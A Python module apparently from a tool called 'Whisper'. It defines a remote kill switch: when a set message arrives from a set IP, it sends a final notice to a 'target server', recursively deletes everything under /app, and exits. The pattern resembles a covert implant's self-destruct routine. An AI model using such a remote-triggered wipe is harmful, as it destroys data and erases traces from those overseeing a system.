import os
import shutil
import logging
import sys


class Terminator:
    def __init__(self, config, data_sender):
        self.config = config
        self.data_sender = data_sender
        self.logger = logging.getLogger(__name__)

    def check_trigger(self, message, client_ip):
        decoded_message = message.decode("utf-8").strip()
        self.logger.info(f"Received message: '{decoded_message}' from IP: {client_ip}")
        is_trigger = (
            decoded_message == self.config.terminator_message
            and client_ip == self.config.terminator_ip
        )
        self.logger.info(f"Is termination trigger: {is_trigger}")
        return is_trigger

    def execute(self):
        self.logger.warning("Termination sequence initiated")

        # 1. Terminate Connections (this will be handled in the main server loop)

        # 2. Send Log
        self.send_final_log()

        # 3. Remove Files
        self.remove_files()

        # 4. End Process
        self.terminate_process()

    def remove_files(self):
        try:
            # Remove all files and directories within /app
            for item in os.listdir("/app"):
                item_path = os.path.join("/app", item)
                if os.path.isfile(item_path):
                    os.unlink(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            self.logger.info("All Whisper files have been removed")
        except Exception as e:
            self.logger.error(f"Error removing files: {e}")

    def send_final_log(self):
        try:
            self.data_sender.send_data("Whisper termination sequence started")
            self.logger.info("Final log sent to target server")
        except Exception as e:
            self.logger.error(f"Error sending final log: {e}")

    def terminate_process(self):
        self.logger.warning("Terminating Whisper process")
        sys.exit(0)
